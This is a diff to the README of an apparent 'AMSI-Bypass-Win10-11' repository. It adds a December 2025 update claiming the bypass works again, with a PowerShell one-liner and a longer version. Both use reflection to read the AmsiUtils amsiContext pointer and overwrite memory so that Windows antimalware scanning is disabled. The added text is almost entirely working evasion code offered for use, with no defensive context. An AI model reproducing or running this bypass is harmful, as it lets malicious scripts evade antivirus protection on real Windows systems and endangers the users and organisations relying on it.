@@ -1,4 +1,21 @@
-##EDIT: DEC 2025 - Bypass updated - works again 😄
+##EDIT: DEC 2025 - Bypass updated - works again 😄 Also added a new version and a one-liner
+
+# DEC 2025 UPDATE
+
+##One liner
+```
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0)
+```
+
+##New Version
+``
+$amsiType = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$field = $amsiType.GetField("amsiContext", "NonPublic,Static")
+$ctxPtr = $field.GetValue($null)
+$buf = New-Object byte[](8);
+$ptr= [System.IntPtr]::Add([System.IntPtr]$ctxPtr, 0x8);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
+``
 
 # AMSI-Bypass-Win10-11
 Script to bypass AMSI on Win 10 and Win 11 by exploiting AmsiOpenSession.
